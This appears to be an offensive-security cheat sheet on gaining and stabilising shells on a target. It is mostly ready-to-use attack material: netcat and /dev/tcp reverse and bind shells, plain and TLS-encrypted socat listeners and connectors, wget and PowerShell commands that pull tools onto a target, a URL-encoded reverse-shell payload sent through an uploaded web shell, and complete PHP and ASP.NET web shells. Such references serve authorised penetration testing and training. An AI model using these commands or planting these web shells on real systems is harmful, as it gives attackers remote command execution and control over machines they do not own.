Shells

  • Revshells
  • Meterpreter multi/handler can be found on the Metasploit page.

Which One To Choose​

Reverse shells:

  • Target can make outbound connections?
  • Firewalls block inbound connections?
  • Target is behind NAT (Network Address Translation) without port forwarding?
  • You want to control the listening port on your own machine?

Bind shells:

  • Outbound connections from the target are restricted?
  • You can't accept inbound connections on your host?
  • Target has accessible ports (through firewall rules or port forwarding)?
  • You need multiple people to access the same shell?

Reverse​

Reverse Shell: Target machine connects to attacker with an outbound connection.

# attacker opens a listener
nc -lvnp 4444

# target connects
nc <local_host> 4444 -e /bin/bash

RevShell File Example​

cat > shell.sh << 'EOF'

#!/bin/bash
bash -i >& /dev/tcp/<LOCALHOST>/<PORT> 0>&1

EOF

Remember to set execution privs:
chmod +x shell.sh

Bind​

Bind Shell: Target opens a port and wait connection.

# target opens a listener
nc -lvnp 4444 -e /bin/bash

# attacker connects
nc <remote_host> 4444

Shell Stabilization​

Use Rlwrap​

# apt install rlwrap
rlwrap nc -lvnp 4444

Configure tty​

stty sane rollback if things get out of control.

# attack host
stty size

# target
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# attack host -- suspend shell CTRL + Z 
stty raw -echo;fg

# target
stty rows <ROWS> cols <COLS>

Socat​

Transfer Binary​

# start server
python3 -m http.server

# transfer socat binary linux
wget http://<local_host>/socat -O /tmp/socat && chmod +x /tmp/socat

# transfer socat binary windows
Invoke-WebRequest -Uri http://<local_host>/socat.exe -OutFile C:\Windows\Temp\socat.exe

Listeners​

# linux
socat TCP-L:5555 FILE:`tty`,raw,echo=0

# windows
socat TCP-L:5555 EXEC:cmd.exe,pipes

Connectors​

# linux
socat TCP:<local_host>:5555 EXEC:"bash -li",pty,stderr,sigint,setsid,sane

# windows
socat TCP:<LOCAL_HOST>:5555 EXEC:powershell.exe,pipes

Encrypted Socat​

Sometimes, a real engagement requires a little finesse.

Certificate Generation and Management​

# gen
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt

# combine
cat shell.key shell.crt > /tmp/shell.pem

Listeners​

# linux
socat OPENSSL-LISTEN:8443,cert=/tmp/shell.pem,verify=0 EXEC:"bash -li"

# tty
socat OPENSSL-LISTEN:8443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0

# windows
socat OPENSSL-LISTEN:8443,cert=C:\Windows\Temp\shell.pem,verify=0 EXEC:cmd.exe,pipes

Connectors​

# linux
socat OPENSSL:<LOCAL_HOST>:8443,verify=0 EXEC:/bin/bash

# tty
socat OPENSSL:<LOCAL_HOST>:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane

# windows
socat OPENSSL:<LOCAL_HOST>:8443,verify=0 EXEC:powershell.exe,pipes

Webshells​

Kali: /usr/share/webshells

You can try to upgrade to a full shell from a webshell. Just URL encode a shell connector based on the target host.

Linux example: bash%20-i%20%3E&%20/dev/tcp/%3Ctarget%3E/8443%200%3E&1 Then: http://<target>/uploads/shell.php?cmd=bash%20-i%20%3E&%20/dev/tcp/%3Ctarget%3E/8443%200%3E&1

PHP​

GET Based​

<?php echo "" . shell_exec($_GET["cmd"]) . ""; ?>
http://<target>/uploads/shell.php?cmd=whoami
http://<target>/uploads/shell.php?cmd=id
http://<target>/uploads/shell.php?cmd=ls -la /var/www/html
...

POST Based​

<?php
if ($_POST['cmd']) {
    echo "" . shell_exec($_POST['cmd']) . "";
}
?>

POST Based with Authentication​

They're MY shells >:|

<?php
$password = "supersecurepasswordhehe";
if ($_POST['auth'] === $password && $_POST['cmd']) {
    echo "" . shell_exec($_POST['cmd']) . "";
} else if ($_POST['auth'] && $_POST['auth'] !== $password) {
    echo "Authentication failed";
}
?>

Platform-Specific​

ASP.NET​

<​%@ Page Language="C#" %​>
<​%@ Import Namespace="System.Diagnostics" %​>
<​%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("" + p.StandardOutput.ReadToEnd() + "");
}
%​>
